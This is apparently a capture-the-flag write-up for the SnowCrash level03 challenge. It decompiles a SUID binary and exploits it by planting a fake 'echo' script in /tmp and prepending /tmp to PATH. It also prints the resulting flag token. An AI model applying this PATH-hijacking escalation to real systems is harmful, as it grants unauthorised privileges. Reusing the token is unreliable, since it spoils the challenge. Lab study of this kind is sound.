# Flag 03

In the level03 home directory we found a binary file `level03` owned by flag03 we executed the binary and it printed `Exploit me`

```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```
we noticed there is an s in the file permissions
A file with SUID always executes as the user who owns the file, regardless of the user passing the command.

So we used the binary ninja to find out what the binary really do ! 🤔

inside the main function we found that the binary is executing an echo command with the file uid and guid.
```c
gid_t eax = getegid();
uid_t eax_1 = geteuid();
setresgid(eax, eax, eax);
setresuid(eax_1, eax_1, eax_1);
return system("/usr/bin/env echo Exploit me");
```

So if we could make it executing the getflag command it wil be executed as the user who owns the file, we had to make a fake echo command and changing ecport it's path so the the binary will call our echo 😉.

```bash
#!/bin/bash

echo getflag > /tmp/echo
export PATH=/tmp:$PATH
chmod +x /tmp/echo
```

and booom 
```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```